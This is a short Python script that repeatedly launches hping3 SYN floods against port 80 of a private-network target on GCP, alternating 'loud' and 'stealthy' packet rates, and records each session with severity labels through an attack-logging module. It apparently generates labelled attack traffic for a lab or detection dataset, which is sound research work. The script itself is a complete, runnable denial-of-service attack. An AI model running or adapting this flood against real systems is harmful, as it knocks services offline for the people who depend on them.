#!/usr/bin/env python3
import subprocess
import time
import sys
from attack_logger import log_attack_session, now_utc

TARGET_IP = "10.1.0.2"
SOURCE_IP = "10.1.1.2"
CLOUD = "gcp"
FLOOD_DURATION = 10
MAX_ATTACK_SECONDS = FLOOD_DURATION + 20

def run_dos(session_num, attack_type, hping_rate_flag, severity):
    session_id = f"dos_volumetric_{CLOUD}_{session_num:03d}"
    command = f"hping3 -S -p 80 {hping_rate_flag} {TARGET_IP}"
    full_command = f"timeout {FLOOD_DURATION} {command}"

    start_ts = now_utc()
    print(f"[{session_id}] Starting: {full_command}")

    outcome_note = attack_type
    try:
        result = subprocess.run(
            full_command.split(),
            capture_output=True,
            text=True,
            timeout=MAX_ATTACK_SECONDS
        )
        outcome_note = f"{attack_type}_completed"
    except subprocess.TimeoutExpired:
        outcome_note = f"{attack_type}_timed_out"
    except Exception as e:
        print(f"[{session_id}] ERROR: {e}")
        outcome_note = f"{attack_type}_error"
    finally:
        end_ts = now_utc()
        log_attack_session(
            session_id=session_id, attack_category="dos_volumetric",
            tool="hping3", command=command, start_ts=start_ts, end_ts=end_ts,
            source_ip=SOURCE_IP, target_ip=TARGET_IP, cloud=CLOUD,
            target_port=80, intended_severity=severity, notes=outcome_note
        )
        print(f"[{session_id}] Logged. Duration: {(end_ts - start_ts).total_seconds():.2f}s")

if __name__ == "__main__":
    num_sessions = int(sys.argv[1]) if len(sys.argv) > 1 else 5
    for i in range(1, num_sessions + 1):
        if i % 3 == 0:
            run_dos(i, "stealthy_dos", "-i u1000", "stealthy")
        else:
            run_dos(i, "loud_dos", "-i u500", "loud")
        time.sleep(65)
